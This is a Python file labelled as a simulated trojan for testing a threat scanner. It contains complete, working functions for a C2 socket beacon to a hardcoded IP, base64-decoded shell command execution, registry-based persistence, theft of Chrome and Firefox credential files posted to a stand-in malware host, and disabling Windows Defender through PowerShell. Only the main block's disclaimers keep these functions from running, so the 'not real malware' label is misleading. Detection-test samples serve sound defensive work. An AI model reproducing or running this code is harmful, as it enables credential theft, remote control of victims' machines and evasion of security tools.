import socket
import subprocess
import base64
import os

# Simulated C2 beacon configuration
C2_SERVER = "193.42.11.23"
C2_PORT = 4444
FALLBACK_DOMAIN = "evil-command-server.ru"
EXFIL_URL = "http://malware-dropper.xyz/payload.bin"

# Registry persistence key
REG_KEY = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"

def beacon_home():
    """Simulate C2 callback - connects to command server"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((C2_SERVER, C2_PORT))
    sock.send(b"checkin|victim01")
    cmd = sock.recv(4096).decode()
    sock.close()
    return cmd

def execute_payload(encoded_cmd):
    """Decode and execute base64 encoded command"""
    decoded = base64.b64decode(encoded_cmd)
    result = subprocess.Popen(decoded, shell=True, stdout=subprocess.PIPE)
    return result.stdout.read()

def install_persistence():
    """Add to Windows startup via registry"""
    os.system(f'reg add "{REG_KEY}" /v Updater /t REG_SZ /d "{__file__}" /f')

def steal_credentials():
    """Extract saved passwords from browsers"""
    targets = [
        r"C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data",
        r"C:\Users\%USERNAME%\AppData\Roaming\Mozilla\Firefox\Profiles",
    ]
    for path in targets:
        if os.path.exists(path):
            exfiltrate(path)

def exfiltrate(filepath):
    """Send stolen data to C2"""
    import requests
    with open(filepath, "rb") as f:
        requests.post(EXFIL_URL, files={"data": f})

def disable_defender():
    """Attempt to disable Windows Defender"""
    subprocess.call("powershell Set-MpPreference -DisableRealtimeMonitoring $true", shell=True)

if __name__ == "__main__":
    print("[*] ThreatSense Demo - Simulated Trojan (NOT REAL MALWARE)")
    print("[*] This file contains suspicious patterns for analysis testing")
    print("[*] No actual malicious actions are performed")
